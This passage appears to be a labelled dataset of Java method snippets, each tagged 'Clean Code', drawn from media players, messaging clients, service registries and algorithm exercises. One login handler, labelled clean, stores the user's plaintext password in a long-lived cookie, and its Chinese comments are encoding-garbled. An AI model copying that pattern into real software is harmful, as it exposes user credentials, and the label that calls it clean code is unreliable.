  canvas.scale(s,s);
  canvas.drawBitmap(generatingCacheBitmap,0,0,null);
  canvas.restore();
  cacheGenerateTimestamp=metaData[3];
  return 1;
}",0,Clean Code
"/** 
 * 鐧诲綍鐢ㄦ埛
 * @param user 鍙傛暟灏佽鐨刡ean
 * @return 鎴愬姛200锛岀敤鎴蜂笉瀛樺湪201锛屽紓甯�500
 */
@ApiOperation(""鐢ㄦ埛鐧诲綍"") @ApiImplicitParams({@ApiImplicitParam(name=""user"",value=""鐢ㄦ埛bean""),@ApiImplicitParam(name=""valistr"",value=""楠岃瘉鐮�""),@ApiImplicitParam(name=""token"",value=""娴忚鍣ㄧ殑token""),@ApiImplicitParam(name=""remname"",value=""鏄惁璁颁綇鐢ㄦ埛鍚�""),@ApiImplicitParam(name=""autologin"",value=""鏄惁鑷姩鐧诲綍"")}) @RequestMapping(value=""/manage/login"",method=RequestMethod.POST) @ResponseBody public SysResult loginUser(User user,@RequestParam(""valistr"") String valistr,@RequestParam(""token"") String token,@RequestParam(value=""remname"") boolean remname,@RequestParam(value=""autologin"") boolean autologin,HttpServletRequest request,HttpServletResponse response){
  try {
    String ticket=this.userService.loginUser(user,valistr,token);
    if (StringUtils.isEmpty(ticket))     return SysResult.build(201,""鐢ㄦ埛涓嶅瓨鍦�"",null);
 else {
      CookieUtils.setCookie(request,response,""EM_TICKET"",ticket,-1,true);
      if (remname || autologin)       CookieUtils.setCookie(request,response,""USERNAME"",user.getUserName(),Integer.MAX_VALUE,true);
      if (autologin)       CookieUtils.setCookie(request,response,""PASSWORD"",user.getUserPassword(),2592000,true);
      return SysResult.ok();
    }
  }
 catch (  MsgException e) {
    return SysResult.build(202,e.getMessage(),e);
  }
catch (  Exception e) {
    e.printStackTrace();
    return SysResult.build(500,e.getMessage(),e);
  }
}",0,Clean Code
"/** 
 * Returns whether it may be possible to load the given URIs based on the network security policy's cleartext traffic permissions.
 * @param uris A list of URIs that will be loaded.
 * @return Whether it may be possible to load the given URIs.
 */
@TargetApi(24) public static boolean checkCleartextTrafficPermitted(Uri... uris){
  if (Util.SDK_INT < 24) {
    return true;
  }
  for (  Uri uri : uris) {
    if (""http"".equals(uri.getScheme()) && !NetworkSecurityPolicy.getInstance().isCleartextTrafficPermitted(Assertions.checkNotNull(uri.getHost()))) {
      return false;
    }
  }
  return true;
}",0,Clean Code
"/** 
 * Execute command
 */
@Override public List<ExecuteResult> execute(Command command){
  List<ExecuteResult> result=new ArrayList<>();
  result=super.execute(command);
  if (CollectionUtils.isNotEmpty(result)) {
    for (    ExecuteResult executeResult : result) {
      if (executeResult.getHeaderList() != null) {
        for (        Header header : executeResult.getHeaderList()) {
          header.setName(formatTableName(header.getName()));
        }
      }
    }
  }
  return result;
}
/** 
 */
@Override public ExecuteResult execute(final String sql,Connection connection,boolean limitRowSize,Integer offset,Integer count,ValueHandler valueHandler) throws SQLException {
  return super.execute(sql,connection,limitRowSize,offset,count,valueHandler);
}
",0,Clean Code
"/** 
 * @param val value to convert
 * @param defaultValue default value to return is the conversion doesn't work or is null.
 * @return BigDecimal conversion of the original value, or the defaultValue if unableto convert. 
 */
static BigDecimal objectToBigDecimal(Object val,BigDecimal defaultValue){
  if (NULL.equals(val)) {
    return defaultValue;
  }
  if (val instanceof BigDecimal) {
    return (BigDecimal)val;
  }
  if (val instanceof BigInteger) {
    return new BigDecimal((BigInteger)val);
  }
  if (val instanceof Double || val instanceof Float) {
    final double d=((Number)val).doubleValue();
    if (Double.isNaN(d)) {
      return defaultValue;
    }
    return new BigDecimal(((Number)val).doubleValue());
  }
  if (val instanceof Long || val instanceof Integer || val instanceof Short|| val instanceof Byte) {
    return new BigDecimal(((Number)val).longValue());
  }
  try {
    return new BigDecimal(val.toString());
  }
 catch (  Exception e) {
    return defaultValue;
  }
}
",0,Clean Code
"/** 
 * Registers a custom MIME type. Most applications do not need to call this method, as handling of standard MIME types is built in. These built-in MIME types take precedence over any registered via this method. If this method is used, it must be called before creating any player(s).
 * @param mimeType The custom MIME type to register.
 * @param codecPrefix The RFC 6381-style codec string prefix associated with the MIME type.
 * @param trackType The {@link C}{@code .TRACK_TYPE_*} constant associated with the MIME type.This value is ignored if the top-level type of  {@code mimeType} is audio, video or text.
 */
public static void registerCustomMimeType(String mimeType,String codecPrefix,int trackType){
  CustomMimeType customMimeType=new CustomMimeType(mimeType,codecPrefix,trackType);
  int customMimeTypeCount=customMimeTypes.size();
  for (int i=0; i < customMimeTypeCount; i++) {
    if (mimeType.equals(customMimeTypes.get(i).mimeType)) {
      customMimeTypes.remove(i);
      break;
    }
  }
  customMimeTypes.add(customMimeType);
}",0,Clean Code
"public static void execStartActivityFromAppTask(Instrumentation original,Context who,IBinder contextThread,IAppTask appTask,Intent intent,Bundle options){
  if (execStartActivityFromAppTaskMethod == null) {
    try {
      execStartActivityFromAppTaskMethod=Instrumentation.class.getDeclaredMethod(""execStartActivityFromAppTask"",Context.class,IBinder.class,IAppTask.class,Intent.class,Bundle.class);
    }
 catch (    NoSuchMethodException e) {
      e.printStackTrace();
    }
  }
  if (execStartActivityFromAppTaskMethod != null) {
    try {
      execStartActivityFromAppTaskMethod.invoke(original,who,contextThread,appTask,intent,options);
    }
 catch (    IllegalAccessException|InvocationTargetException e) {
      e.printStackTrace();
    }
  }
}
",0,Clean Code
"private void callEnded(){
  if (BuildVars.LOGS_ENABLED) {
    FileLog.d(""Call "" + getCallID() + "" ended"");
  }
  if (groupCall != null && (!playedConnectedSound || onDestroyRunnable != null)) {
    needPlayEndSound=false;
  }
  AndroidUtilities.runOnUIThread(() -> dispatchStateChanged(STATE_ENDED));
  int delay=700;
  Utilities.globalQueue.postRunnable(() -> {
    if (spPlayId != 0) {
      soundPool.stop(spPlayId);
      spPlayId=0;
    }
  }
);
  if (connectingSoundRunnable != null) {
    AndroidUtilities.cancelRunOnUIThread(connectingSoundRunnable);
    connectingSoundRunnable=null;
  }
  if (needPlayEndSound) {
    playingSound=true;
    if (groupCall == null) {
      Utilities.globalQueue.postRunnable(() -> soundPool.play(spEndId,1,1,0,0,1));
    }
 else {
      Utilities.globalQueue.postRunnable(() -> soundPool.play(spVoiceChatEndId,1.0f,1.0f,0,0,1),100);
      delay=500;
    }
    AndroidUtilities.runOnUIThread(afterSoundRunnable,delay);
  }
  if (timeoutRunnable != null) {
    AndroidUtilities.cancelRunOnUIThread(timeoutRunnable);
    timeoutRunnable=null;
  }
  endConnectionServiceCall(needPlayEndSound ? delay : 0);
  stopSelf();
}",0,Clean Code
"public static void OpenFolder(String path) throws IOException {
  String program=null;
  if (isWindows()) {
    program=""explorer.exe"";
  }
 else   if (isMac()) {
    program=""open"";
  }
 else {
    program=""nautilus"";
  }
  if ((path.startsWith(""\"""") && path.endsWith(""\"""")) || (path.startsWith(""'"") && path.endsWith(""'""))) {
  }
 else   if (path.contains("" "")) {
    path=""\"""" + path + ""\"""";
  }
  String[] cmdArray=new String[]{program,path};
  Runtime.getRuntime().exec(cmdArray);
}
",0,Clean Code
"@SuppressLint(""DiscouragedApi"") public static void scale(ImageView mBatteryIconView){
  if (mBatteryIconView == null || !mShouldScale) {
    return;
  }
  Context context=mBatteryIconView.getContext();
  Resources res=context.getResources();
  TypedValue typedValue=new TypedValue();
  res.getValue(res.getIdentifier(""status_bar_icon_scale_factor"",""dimen"",context.getPackageName()),typedValue,true);
  float iconScaleFactor=typedValue.getFloat() * (scaleFactor / 100f);
  int height=Math.round(res.getDimensionPixelSize(res.getIdentifier(""status_bar_battery_icon_height"",""dimen"",context.getPackageName())) * iconScaleFactor);
  int width=Math.round(res.getDimensionPixelSize(res.getIdentifier((customBatteryEnabled) ? ""status_bar_battery_icon_height"" : ""status_bar_battery_icon_width"",""dimen"",context.getPackageName())) * iconScaleFactor);
  mBatteryIconView.post(() -> {
    ViewGroup.LayoutParams scaledLayoutParams=mBatteryIconView.getLayoutParams();
    scaledLayoutParams.height=height;
    scaledLayoutParams.width=width;
    mBatteryIconView.setLayoutParams(scaledLayoutParams);
  }
);
}",0,Clean Code
"@Override public boolean handler(TaskInfo taskInfo){
  try {
    DingDingWorkNoticeAccount account=accountUtils.getAccountById(taskInfo.getSendAccount(),DingDingWorkNoticeAccount.class);
    String accessToken=accessTokenUtils.getAccessToken(taskInfo.getSendChannel(),taskInfo.getSendAccount(),account,false);
    OapiMessageCorpconversationAsyncsendV2Request request=assembleParam(account,taskInfo);
    OapiMessageCorpconversationAsyncsendV2Response response=new DefaultDingTalkClient(SendChanelUrlConstant.DING_DING_SEND_URL).execute(request,accessToken);
    if (response.isSuccess()) {
      saveRecallInfo(DING_DING_RECALL_KEY_PREFIX,taskInfo.getMessageTemplateId(),String.valueOf(response.getTaskId()),CommonConstant.ONE_DAY_SECOND);
      return true;
    }
    log.error(""DingDingWorkNoticeHandler#handler fail!result:{},params:{}"",JSON.toJSONString(response),JSON.toJSONString(taskInfo));
  }
 catch (  Exception e) {
    log.error(""DingDingWorkNoticeHandler#handler fail!{},params:{}"",Throwables.getStackTraceAsString(e),taskInfo);
  }
  return false;
}",0,Clean Code
"@Test public void testPlaylistWithLazyMediaSource() throws IOException, InterruptedException {
  FakeMediaSource[] fastSources=createMediaSources(2);
  final FakeMediaSource[] lazySources=new FakeMediaSource[4];
  for (int i=0; i < 4; i++) {
    lazySources[i]=new FakeMediaSource(null,null);
  }
  mediaSource.addMediaSource(lazySources[0]);
  mediaSource.addMediaSource(0,fastSources[0]);
  mediaSource.removeMediaSource(1);
  mediaSource.addMediaSource(1,lazySources[1]);
  testRunner.assertNoTimelineChange();
  Timeline timeline=testRunner.prepareSource();
  TimelineAsserts.assertPeriodCounts(timeline,1,1);
  TimelineAsserts.assertWindowTags(timeline,111,null);
  TimelineAsserts.assertWindowIsDynamic(timeline,false,true);
  testRunner.runOnPlaybackThread(() -> lazySources[1].setNewSourceInfo(createFakeTimeline(8),null));
  timeline=testRunner.assertTimelineChangeBlocking();
  TimelineAsserts.assertPeriodCounts(timeline,1,9);
  TimelineAsserts.assertWindowTags(timeline,111,999);
  TimelineAsserts.assertWindowIsDynamic(timeline,false,false);
  testRunner.assertPrepareAndReleaseAllPeriods();
  testRunner.assertCompletedManifestLoads(0,1);
  assertCompletedAllMediaPeriodLoads(timeline);
  mediaSource.addMediaSource(1,lazySources[2]);
  testRunner.assertTimelineChangeBlocking();
  mediaSource.addMediaSource(2,fastSources[1]);
  testRunner.assertTimelineChangeBlocking();
  mediaSource.addMediaSource(0,lazySources[3]);
  testRunner.assertTimelineChangeBlocking();
  mediaSource.removeMediaSource(2);
  timeline=testRunner.assertTimelineChangeBlocking();
  TimelineAsserts.assertPeriodCounts(timeline,1,1,2,9);
  TimelineAsserts.assertWindowTags(timeline,null,111,222,999);
  TimelineAsserts.assertWindowIsDynamic(timeline,true,false,false,false);
  MediaPeriod lazyPeriod=testRunner.createPeriod(new MediaPeriodId(timeline.getUidOfPeriod(0),0));
  CountDownLatch preparedCondition=testRunner.preparePeriod(lazyPeriod,0);
  assertThat(preparedCondition.getCount()).isEqualTo(1);
  MediaPeriod secondLazyPeriod=testRunner.createPeriod(new MediaPeriodId(timeline.getUidOfPeriod(0),0));
  testRunner.releasePeriod(secondLazyPeriod);
  testRunner.runOnPlaybackThread(() -> lazySources[3].setNewSourceInfo(createFakeTimeline(7),null));
  timeline=testRunner.assertTimelineChangeBlocking();
  TimelineAsserts.assertPeriodCounts(timeline,8,1,2,9);
  TimelineAsserts.assertWindowTags(timeline,888,111,222,999);
  TimelineAsserts.assertWindowIsDynamic(timeline,false,false,false,false);
  assertThat(preparedCondition.getCount()).isEqualTo(0);
  testRunner.releasePeriod(lazyPeriod);
  testRunner.releaseSource();
  for (  FakeMediaSource fastSource : fastSources) {
    fastSource.assertReleased();
  }
  for (  FakeMediaSource lazySource : lazySources) {
    lazySource.assertReleased();
  }
}",0,Clean Code
"/** 
 * Increase player's min/max buffer size to 60 secs
 * @return load control
 */
private DefaultLoadControl createLoadControl(){
  DefaultLoadControl.Builder baseBuilder=new DefaultLoadControl.Builder();
  int minBufferMs=30_000;
  int maxBufferMs=30_000;
  int bufferForPlaybackMs=2_500;
  int bufferForPlaybackAfterRebufferMs=5_000;
switch (mPlayerData.getVideoBufferType()) {
case PlayerData.BUFFER_HIGH:
    minBufferMs=50_000;
  maxBufferMs=100_000;
baseBuilder.setTargetBufferBytes(mMaxBufferBytes);
baseBuilder.setBackBuffer(minBufferMs,true);
break;
case PlayerData.BUFFER_MEDIUM:
minBufferMs=50_000;
maxBufferMs=50_000;
baseBuilder.setBackBuffer(minBufferMs,true);
break;
case PlayerData.BUFFER_LOW:
minBufferMs=30_000;
maxBufferMs=30_000;
break;
case PlayerData.BUFFER_NONE:
minBufferMs=1_000;
maxBufferMs=1_000;
bufferForPlaybackMs=1_000;
bufferForPlaybackAfterRebufferMs=0;
break;
}
baseBuilder.setBufferDurationsMs(minBufferMs,maxBufferMs,bufferForPlaybackMs,bufferForPlaybackAfterRebufferMs);
return baseBuilder.createDefaultLoadControl();
}",0,Clean Code
"/** 
 * Register an instance to a service in AP mode. <p> This method creates service or cluster silently if they don't exist.
 * @param namespaceId id of namespace
 * @param serviceName service name
 * @param instance    instance to register
 * @throws Exception any error occurred in the process
 */
public void registerInstance(String namespaceId,String serviceName,Instance instance) throws NacosException {
  createEmptyService(namespaceId,serviceName,instance.isEphemeral());
  Service service=getService(namespaceId,serviceName);
  if (service == null) {
    throw new NacosException(NacosException.INVALID_PARAM,""service not found, namespace: "" + namespaceId + "", service: ""+ serviceName);
  }
  addInstance(namespaceId,serviceName,instance.isEphemeral(),instance);
}
",0,Clean Code
"private void updateHistory(){
  Video video=getVideo();
  if (video == null || (video.isShorts && mGeneralData.isHideShortsFromHistoryEnabled()) || mIncognito || !getPlayer().containsMedia() || (video.isRemote && mRemoteControlData.isRemoteHistoryDisabled())) {
    return;
  }
  long positionMs=video.isLive ? 0 : getPlayer().getPositionMs();
  MediaServiceManager.instance().updateHistory(video,positionMs);
}",0,Clean Code
"/** 
 * Encoding according to the escape method in javascript
 * @return Encoded string
 */
public static String jsEncode(String str){
  if (null == str) {
    return null;
  }
  char[] cs=str.toCharArray();
  StringBuilder sBuilder=new StringBuilder(str.length());
  for (int i=0; i < cs.length; ++i) {
    int c=cs[i] & 0xFFFF;
    if (((c >= '0') && (c <= '9')) || (((c >= 'a') && (c <= 'z')) || ((c >= 'A') && (c <= 'Z')))) {
      sBuilder.append(cs[i]);
    }
 else {
      sBuilder.append('%');
      if (c > 255) {
        sBuilder.append('u');
      }
      sBuilder.append(Integer.toHexString(c));
    }
  }
  return sBuilder.toString();
}",0,Clean Code
"/** 
 * Constructs an ViewHolder and caches the relevant subviews.
 */
public ViewHolder(View v){
  this(v,false);
}
/** 
 * Constructs an ViewHolder for sub action and caches the relevant subviews.
 */
public ViewHolder(View v,boolean isSubAction){
  super(v);
  mContentView=v.findViewById(R.id.guidedactions_item_content);
  mTitleView=(TextView)v.findViewById(R.id.guidedactions_item_title);
  mActivatorView=v.findViewById(R.id.guidedactions_activator_item);
  mDescriptionView=(TextView)v.findViewById(R.id.guidedactions_item_description);
  mIconView=(ImageView)v.findViewById(R.id.guidedactions_item_icon);
  mCheckmarkView=(ImageView)v.findViewById(R.id.guidedactions_item_checkmark);
  mChevronView=(ImageView)v.findViewById(R.id.guidedactions_item_chevron);
  mIsSubAction=isSubAction;
  v.setAccessibilityDelegate(mDelegate);
}
",0,Clean Code
"private void resendCodeFromSafetyNet(Bundle params,TLRPC.auth_SentCode res){
  if (!isRequestingFirebaseSms) {
    return;
  }
  needHideProgress(false);
  isRequestingFirebaseSms=false;
  TLRPC.TL_auth_resendCode req=new TLRPC.TL_auth_resendCode();
  req.phone_number=params.getString(""phoneFormated"");
  req.phone_code_hash=res.phone_code_hash;
  ConnectionsManager.getInstance(currentAccount).sendRequest(req,(response,error) -> {
    if (response != null) {
      AndroidUtilities.runOnUIThread(() -> fillNextCodeParams(params,(TLRPC.auth_SentCode)response));
    }
 else {
      AndroidUtilities.runOnUIThread(() -> {
        if (getParentActivity() == null || getParentActivity().isFinishing() || getContext() == null) {
          return;
        }
        new AlertDialog.Builder(getContext()).setTitle(getString(R.string.RestorePasswordNoEmailTitle)).setMessage(getString(R.string.SafetyNetErrorOccurred)).setPositiveButton(getString(R.string.OK),(dialog,which) -> {
          forceDisableSafetyNet=true;
          if (currentViewNum != VIEW_PHONE_INPUT) {
            setPage(VIEW_PHONE_INPUT,true,null,true);
          }
        }
).show();
      }
);
    }
  }
,ConnectionsManager.RequestFlagFailOnServerErrors | ConnectionsManager.RequestFlagWithoutLogin);
}
",0,Clean Code
"@Override public void onClick(View view){
  if (cancelable && isShowing() && shouldWindowCloseOnTouchOutside()) {
    cancel();
  }
}
",0,Clean Code
"/** 
 * Tries to find an existing media period info from the specified window index. Only returns a non-null media period info if there is a unique, unambiguous match.
 */
public @Nullable MediaPeriodInfo tryResolveWindowIndex(int windowIndex){
  MediaPeriodInfo match=null;
  for (int i=0; i < mediaPeriodInfoQueue.size(); i++) {
    MediaPeriodInfo info=mediaPeriodInfoQueue.get(i);
    int periodIndex=timeline.getIndexOfPeriod(info.mediaPeriodId.periodUid);
    if (periodIndex != C.INDEX_UNSET && timeline.getPeriod(periodIndex,period).windowIndex == windowIndex) {
      if (match != null) {
        return null;
      }
      match=info;
    }
  }
  return match;
}",0,Clean Code
"private boolean callListenerOnPressAndCheckKeyboardLayoutChange(final Key key,final int repeatCount){
  if (sInGesture || mIsDetectingGesture || mIsTrackingForActionDisabled) {
    return false;
  }
  final boolean ignoreModifierKey=mIsInDraggingFinger && key.isModifier();
  if (DEBUG_LISTENER) {
    Log.d(TAG,String.format(""[%d] onPress    : %s%s%s%s"",mPointerId,(key == null ? ""none"" : Constants.printableCode(key.getCode())),ignoreModifierKey ? "" ignoreModifier"" : """",key.isEnabled() ? """" : "" disabled"",repeatCount > 0 ? "" repeatCount="" + repeatCount : """"));
  }
  if (ignoreModifierKey) {
    return false;
  }
  if (key.isEnabled()) {
    sListener.onPressKey(key.getCode(),repeatCount,getActivePointerTrackerCount() == 1);
    final boolean keyboardLayoutHasBeenChanged=mKeyboardLayoutHasBeenChanged;
    mKeyboardLayoutHasBeenChanged=false;
    sTimerProxy.startTypingStateTimer(key);
    return keyboardLayoutHasBeenChanged;
  }
  return false;
}",0,Clean Code
"public static int dfs(int[] op,int col,int level,int N){
  if (col == op.length) {
    return process(op,level + 1,N);
  }
  int ans=0;
  ans+=dfs(op,col + 1,level,N);
  if (col + 1 < op.length && op[col] == 0 && op[col + 1] == 0) {
    op[col]=1;
    op[col + 1]=1;
    ans+=dfs(op,col + 2,level,N);
    op[col]=0;
    op[col + 1]=0;
  }
  return ans;
}",0,Clean Code
"static boolean replaceActivityController(Parcel data){
  if (!inited)   return false;
  try {
    var position=data.dataPosition();
    var controller=replaceActivityController(IActivityController.Stub.asInterface(data.readStrongBinder()));
    var b=data.readInt();
    data.setDataSize(position);
    data.setDataPosition(position);
    data.writeStrongInterface(controller);
    data.writeInt(b);
  }
 catch (  Throwable e) {
    Log.e(TAG,""replace activity controller"",e);
  }
 finally {
    data.setDataPosition(0);
  }
  return false;
}
static private IActivityController replaceActivityController(IActivityController controller){
  Log.d(TAG,""android.app.IActivityManager.setActivityController is called"");
  ActivityController.controller=controller;
  return getInstance();
}",0,Clean Code
"static Entry create(String path){
  if (path.contains(File.pathSeparator)) {
    return new CompositeEntry(path);
  }
  if (path.endsWith(""*"")) {
    return new WildcardEntry(path);
  }
  if (path.endsWith("".jar"") || path.endsWith("".JAR"") || path.endsWith("".zip"")|| path.endsWith("".ZIP"")) {
    return new ZipEntry(path);
  }
  return new DirEntry(path);
}
",0,Clean Code
"public static int lcs2(String s1,String s2){
  if (s1 == null || s2 == null || s1.length() == 0 || s2.length() == 0) {
    return 0;
  }
  char[] str1=s1.toCharArray();
  char[] str2=s2.toCharArray();
  int N=str1.length;
  int M=str2.length;
  int min=str1[0];
  int max=str1[0];
  for (int i=1; i < N; i++) {
    min=Math.min(min,str1[i]);
    max=Math.max(max,str1[i]);
  }
  for (int i=0; i < M; i++) {
    min=Math.min(min,str2[i]);
    max=Math.max(max,str2[i]);
  }
  int[] all=new int[N + M + 1];
  int index=0;
  for (int i=0; i < N; i++) {
    all[index++]=str1[i] - min + 2;
  }
  all[index++]=1;
  for (int i=0; i < M; i++) {
    all[index++]=str2[i] - min + 2;
  }
  DC3 dc3=new DC3(all,max - min + 2);
  int n=all.length;
  int[] sa=dc3.sa;
  int[] height=dc3.height;
  int ans=0;
  for (int i=1; i < n; i++) {
    int Y=sa[i - 1];
    int X=sa[i];
    if (Math.min(X,Y) < N && Math.max(X,Y) > N) {
      ans=Math.max(ans,height[i]);
    }
  }
  return ans;
}",0,Clean Code
"/** 
 * Constructs a MultiLabelTransformer with a threshold of  {@link #DEFAULT_THRESHOLD} whichassumes the model emits probabilities.
 */
public MultiLabelTransformer(){
}
/** 
 * Constructs a MultiLabelTransformer with the supplied threshold.
 * @param threshold The threshold to set. Must be between 0 and 1 if {@code generatesProbabilities} is true.
 * @param generatesProbabilities Does this model produce probabilistic outputs.
 */
public MultiLabelTransformer(double threshold,boolean generatesProbabilities){
  this.threshold=threshold;
  this.generatesProbabilities=generatesProbabilities;
  if (generatesProbabilities && (threshold < 0.0 || threshold > 1.0)) {
    throw new IllegalArgumentException(""Threshold must be between 0 and 1 to generate probabilities, found "" + threshold);
  }
}",0,Clean Code
"/** 
 * Constructs new audio capabilities based on a set of supported encodings and a maximum channel count. <p>Applications should generally call  {@link #getCapabilities(Context)} to obtain an instancebased on the capabilities advertised by the platform, rather than calling this constructor.
 * @param supportedEncodings Supported audio encodings from {@link android.media.AudioFormat}'s {@code ENCODING_*} constants. Passing {@code null} indicates that no encodings aresupported.
 * @param maxChannelCount The maximum number of audio channels that can be played simultaneously.
 */
public AudioCapabilities(@Nullable int[] supportedEncodings,int maxChannelCount){
  if (supportedEncodings != null) {
    this.supportedEncodings=Arrays.copyOf(supportedEncodings,supportedEncodings.length);
    Arrays.sort(this.supportedEncodings);
  }
 else {
    this.supportedEncodings=new int[0];
  }
  this.maxChannelCount=maxChannelCount;
}",0,Clean Code
"@SubscribeEvent public void onRenderTick(TickEvent.RenderTickEvent ev){
  purgeExpiredFragments(null);
  if (Minecraft.getMinecraft().currentScreen != null && !(Minecraft.getMinecraft().currentScreen instanceof GuiMainMenu))   return;
  if (Minecraft.getMinecraft().gameSettings.showDebugInfo)   return;
  ScaledResolution res=new ScaledResolution(Minecraft.getMinecraft());
  int width=res.getScaledWidth();
  int height=res.getScaledHeight();
  float rx=(float)width / 1000f;
  float ry=(float)height / 1000f;
synchronized (this.fragments) {
    for (    TextCategory cat : TextCategory.values()) {
      TextCategoryAttributes atts=this.attributes.get(cat);
      if (atts != null && (!atts.flashing || ((System.currentTimeMillis() / 500) % 3 != 0)) && shouldDisplay(atts.displayLevel)) {
        int x=Math.round(rx * (float)atts.xOrg);
        int y=Math.round(ry * (float)atts.yOrg);
        ArrayList<TextFragment> frags=this.fragments.get(cat);
        if (frags != null && !frags.isEmpty()) {
          for (          TextFragment frag : frags) {
            drawText(frag.text,x,y,atts.colour);
            y+=10;
          }
        }
      }
    }
  }
}",0,Clean Code
"/** 
 * Get attributes from decoder
 * @param decoder the decode object
 * @param reqAttrs the attributes
 */
private void getAttrsFromDecoder(QueryStringDecoder decoder,Map<String,String> reqAttrs){
  for (  Map.Entry<String,List<String>> attr : decoder.parameters().entrySet()) {
    if (attr == null || attr.getKey() == null || attr.getValue() == null || attr.getValue().isEmpty()) {
      continue;
    }
    reqAttrs.put(attr.getKey(),attr.getValue().get(0));
  }
}",0,Clean Code
"/** 
 * Binds the actions in a media item row object to their views. This consists of creating (or reusing the existing) action view holders, and populating them with the actions' icons.
 */
public void onBindRowActions(){
  for (int i=getMediaItemActionsContainer().getChildCount() - 1; i >= mActionViewHolders.size(); i--) {
    getMediaItemActionsContainer().removeViewAt(i);
    mActionViewHolders.remove(i);
  }
  mMediaItemRowActions=null;
  Object rowObject=getRowObject();
  final MultiActionsProvider.MultiAction[] actionList;
  if (rowObject instanceof MultiActionsProvider) {
    actionList=((MultiActionsProvider)rowObject).getActions();
  }
 else {
    return;
  }
  Presenter actionPresenter=mRowPresenter.getActionPresenter();
  if (actionPresenter == null) {
    return;
  }
  mMediaItemRowActions=actionList;
  for (int i=mActionViewHolders.size(); i < actionList.length; i++) {
    final int actionIndex=i;
    final Presenter.ViewHolder actionViewHolder=actionPresenter.onCreateViewHolder(getMediaItemActionsContainer());
    getMediaItemActionsContainer().addView(actionViewHolder.view);
    mActionViewHolders.add(actionViewHolder);
    actionViewHolder.view.setOnFocusChangeListener(new View.OnFocusChangeListener(){
      @Override public void onFocusChange(      View view,      boolean hasFocus){
        mFocusViewAnimator=updateSelector(mSelectorView,view,mFocusViewAnimator,false);
      }
    }
);
    actionViewHolder.view.setOnClickListener(new View.OnClickListener(){
      @Override public void onClick(      View view){
        if (getOnItemViewClickedListener() != null) {
          getOnItemViewClickedListener().onItemClicked(actionViewHolder,mMediaItemRowActions[actionIndex],ViewHolder.this,getRowObject());
        }
      }
    }
);
  }
  if (mMediaItemActionsContainer != null) {
    for (int i=0; i < actionList.length; i++) {
      Presenter.ViewHolder avh=mActionViewHolders.get(i);
      actionPresenter.onUnbindViewHolder(avh);
      actionPresenter.onBindViewHolder(avh,mMediaItemRowActions[i]);
    }
  }
}
/** 
 * Binds the given media item object action to the given ViewHolder's action views.
 * @param vh ViewHolder for the media item.
 */
protected void onBindRowActions(ViewHolder vh){
  vh.onBindRowActions();
}",0,Clean Code
"private void appendContextMenuItemsCategory(AppDialogPresenter settingsPresenter){
  List<OptionItem> options=new ArrayList<>();
  Map<Long,Integer> menuNames=getMenuNames();
  for (  Long menuItem : mMainUIData.getMenuItemsOrdered()) {
    Integer nameResId=menuNames.get(menuItem);
    if (nameResId == null) {
      continue;
    }
    options.add(UiOptionItem.from(getContext().getString(nameResId),optionItem -> {
      if (optionItem.isSelected()) {
        mMainUIData.enableMenuItem(menuItem);
        showMenuItemOrderDialog(menuItem);
      }
 else {
        mMainUIData.disableMenuItem(menuItem);
      }
    }
,mMainUIData.isMenuItemEnabled(menuItem)));
  }
  settingsPresenter.appendCheckedCategory(getContext().getString(R.string.context_menu),options);
}
",0,Clean Code
"private Drawable getEmojiStatusDrawable(TLRPC.EmojiStatus emojiStatus,boolean switchable,boolean animated,int a){
  if (emojiStatusDrawable[a] == null) {
    emojiStatusDrawable[a]=new AnimatedEmojiDrawable.SwapAnimatedEmojiDrawable(nameTextView[a],AndroidUtilities.dp(24),a == 0 ? AnimatedEmojiDrawable.CACHE_TYPE_EMOJI_STATUS : AnimatedEmojiDrawable.CACHE_TYPE_KEYBOARD);
    if (fragmentViewAttached) {
      emojiStatusDrawable[a].attach();
    }
  }
  if (emojiStatus instanceof TLRPC.TL_emojiStatus) {
    emojiStatusDrawable[a].set(((TLRPC.TL_emojiStatus)emojiStatus).document_id,animated);
  }
 else   if (emojiStatus instanceof TLRPC.TL_emojiStatusUntil && ((TLRPC.TL_emojiStatusUntil)emojiStatus).until > (int)(System.currentTimeMillis() / 1000) && !reportSpam) {
    emojiStatusDrawable[a].set(((TLRPC.TL_emojiStatusUntil)emojiStatus).document_id,animated);
  }
 else {
    emojiStatusDrawable[a].set(getPremiumCrossfadeDrawable(),animated);
  }
  updateEmojiStatusDrawableColor();
  return emojiStatusDrawable[a];
}",0,Clean Code
"/** 
 * Returns the AC-3 format given  {@code data} containing the AC3SpecificBox according to ETSI TS102 366 Annex F. The reading position of  {@code data} will be modified.
 * @param data The AC3SpecificBox to parse.
 * @param trackId The track identifier to set on the format.
 * @param language The language to set on the format.
 * @param drmInitData {@link DrmInitData} to be included in the format.
 * @return The AC-3 format parsed from data in the header.
 */
public static Format parseAc3AnnexFFormat(ParsableByteArray data,String trackId,String language,DrmInitData drmInitData){
  int fscod=(data.readUnsignedByte() & 0xC0) >> 6;
  int sampleRate=SAMPLE_RATE_BY_FSCOD[fscod];
  int nextByte=data.readUnsignedByte();
  int channelCount=CHANNEL_COUNT_BY_ACMOD[(nextByte & 0x38) >> 3];
  if ((nextByte & 0x04) != 0) {
    channelCount++;
  }
  return Format.createAudioSampleFormat(trackId,MimeTypes.AUDIO_AC3,null,Format.NO_VALUE,Format.NO_VALUE,channelCount,sampleRate,null,drmInitData,0,language);
}",0,Clean Code
"@Override public boolean isValid(@Nullable Constant value,@NonNull AnnotationValue<ConstantRetryValidation> annotationMetadata,@NonNull ConstraintValidatorContext context){
  if (value == null) {
    return true;
  }
  if (value.getMaxDuration() != null && value.getInterval() != null && value.getMaxDuration().compareTo(value.getInterval()) <= 0) {
    context.disableDefaultConstraintViolation();
    context.buildConstraintViolationWithTemplate(""'interval' must be less than 'maxDuration' but is "" + value.getInterval()).addConstraintViolation();
    return false;
  }
  return true;
}",0,Clean Code
"public static LimitReachedBottomSheet openBoostsForRemoveRestrictions(BaseFragment baseFragment,TL_stories.TL_premium_boostsStatus boostsStatus,ChannelBoostsController.CanApplyBoost canApplyBoos,long dialogId,boolean inFragment){
  if (baseFragment == null || boostsStatus == null || canApplyBoos == null || baseFragment.getContext() == null) {
    return null;
  }
  LimitReachedBottomSheet limitReachedBottomSheet=new LimitReachedBottomSheet(baseFragment,baseFragment.getContext(),TYPE_BOOSTS_FOR_REMOVE_RESTRICTIONS,baseFragment.getCurrentAccount(),baseFragment.getResourceProvider());
  limitReachedBottomSheet.setCanApplyBoost(canApplyBoos);
  limitReachedBottomSheet.setBoostsStats(boostsStatus,true);
  limitReachedBottomSheet.setDialogId(dialogId);
  if (inFragment) {
